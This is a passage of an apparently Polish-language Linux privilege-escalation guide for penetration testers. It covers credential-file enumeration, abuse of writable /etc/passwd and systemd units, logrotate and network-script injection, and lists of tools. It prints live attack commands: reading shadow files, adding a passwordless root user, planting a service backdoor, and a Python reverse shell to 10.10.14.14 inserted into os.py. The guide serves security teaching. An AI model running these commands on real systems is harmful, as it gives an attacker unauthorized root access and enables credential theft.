{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ciekawe pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. W związku z tym, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakiś podejrzany skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie** i **sprawdzić, czy można je odczytać**, aby zobaczyć **czy w plikach znajdują się hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach w pliku `/etc/passwd` (lub jego odpowiedniku) można znaleźć **password hashes**.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Plik /etc/passwd z prawem zapisu

Najpierw wygeneruj hasło jednym z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i dodaj wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Teraz możesz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć następujących linii, aby dodać fikcyjnego użytkownika bez hasła.\
OSTRZEŻENIE: możesz pogorszyć bieżące bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się pod `/etc/pwd.db` i `/etc/master.passwd`, a także `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać w jakimś **pliku konfiguracyjnym usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracyjny usługi Tomcat w /etc/systemd/,** to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie uruchomiony przy następnym uruchomieniu tomcat.

### Sprawdź katalogi

Następujące katalogi mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja / Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki DB Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/Binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), wyszukuje **kilka możliwych plików, które mogą zawierać hasła**.\
**Innym ciekawym narzędziem**, którego możesz użyć do tego jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), która jest otwartoźródłową aplikacją służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym bardziej interesujący będzie (prawdopodobnie).\
Ponadto niektóre "**bad**" skonfigurowane (backdoored?) **audit logs** mogą pozwolić na **zapisanie haseł** wewnątrz audit logs, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Należy również sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **zawartości**, a także szukać IP i adresów e‑mail w logach lub wyrażeń regularnych dla hashy.\
Nie będę tu opisywać, jak to wszystko zrobić, ale jeśli jesteś zainteresowany możesz sprawdzić ostatnie kontrole, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz, skąd zostanie uruchomiony skrypt python i możesz zapisać w tym folderze albo możesz modyfikować biblioteki python, możesz zmodyfikować bibliotekę OS i wstawić do niej backdoor (jeśli możesz zapisać tam, gdzie skrypt python będzie uruchamiany, skopiuj i wklej bibliotekę os.py).

Aby **backdoor** bibliotekę, po prostu dodaj na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Luka w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** na pliku logu lub jego nadrzędnych katalogach potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może być zmanipulowany do wykonania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale także w dowolnym katalogu, w którym stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy `logrotate` w wersji `3.18.0` i starszych

Bardziej szczegółowe informacje o luce można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę lukę za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc zawsze, gdy odkryjesz, że możesz modyfikować logi, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia podstawiając logi jako symlinki.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **zapisać** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** **dostosować** istniejący, to Twój **system jest pwned**.

Skrypty sieciowe, _ifcg-eth0_ na przykład, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednakże są \~sourced\~ na Linuxie przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli masz **spację/znak odstępu w nazwie system próbuje wykonać część po spacji**. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami Linuksa**. Zawiera skrypty do `start`, `stop`, `restart` i czasami `reload` usług. Można je uruchamiać bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, wykorzystującym pliki konfiguracyjne do zarządzania usługami. Mimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart ze względu na warstwę kompatybilności w Upstart.

**systemd** wyłania się jako nowoczesny menedżer inicjalizacji i usług, oferujący zaawansowane funkcje, takie jak uruchamianie daemonów na żądanie, zarządzanie automountami i migawki stanu systemu. Organizuje pliki w katalogach `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz `/etc/systemd/system/` dla modyfikacji administratora, upraszczając proces administracji systemem.

## Inne triki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Frameworki rootujące Androida często podczepiają syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autoryzacja managera (np. sprawdzanie podpisów oparte na FD-order lub słabe schematy haseł) może pozwolić lokalnej aplikacji na podszycie się pod managera i eskalację do root na urządzeniach już zrootowanych. Dowiedz się więcej i zobacz szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Odkrywanie usług oparte na regex w VMware Tools/Aria Operations może wydobyć ścieżkę do binarki z linii poleceń procesu i uruchomić ją z opcją -v w kontekście uprzywilejowanym. Permisywne wzorce (np. użycie \S) mogą dopasować przygotowane przez atakującego nasłuchiwacze w zapisywalnych lokalizacjach (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny w innych stosach discovery/monitoring tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ochrona jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Narzędzia

### **Najlepsze narzędzie do wyszukiwania Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Źródła

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
